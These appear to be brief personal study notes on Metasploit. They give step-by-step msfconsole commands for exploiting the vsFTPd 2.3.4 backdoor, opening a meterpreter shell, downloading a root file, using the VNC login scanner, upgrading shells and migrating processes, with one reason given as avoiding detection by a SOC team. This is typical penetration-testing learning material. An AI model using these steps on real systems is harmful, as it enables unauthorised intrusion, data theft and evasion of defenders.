msfconsole

multi handler: a listener of metasploit

## FTP Exploit
- msfconsole
- search vsFTPd 2.3.4
- use 0
- set RHOSTS <target_ip>, set LHOST <attacker_ip>
- exploit
- sysinfo
- getuid
- shell (to make meter peter shell into interactive)
- ctrl + z to go back in terminal
- sessions
- sessions -n murtaza -i 1
- download /root/vnc.log
## VNC Exploit 
vnc (Virtual Network Computing)
 vnc only required password, username is not required
- msfconsole
- search vnc_login
- use 0

Two type of scanners:
- axillary scanner (They don't give access to machine, they only provide info and ping to machine and use for machine enumeration)
- exploits (They only provide machine access using exploitation, but not for machine enumeration)

Post module: run after exploit

shell_to_meterpeter: module to upgrade simple shell into meterpeter shell.

set sessions 1
sessions -i 2 command to use that newly created shell.


Whenever we get a meterpeter shell, it creates a process.

Every process creates under a parent process.
If parent process ended, all of its child process also ended with it.


`ps` command in meterpeter to list down the current running processes.

`getpid` command to show current process id.

Always migrate to stable process of meterpeter shell before stating further work.

Default stable processes:


`migrate <ID>` command to migrate the shell process to stable process.


Why need to migrate shell:
- unstable process
- parent and child process format mismatched
- easily identifiable by SOC team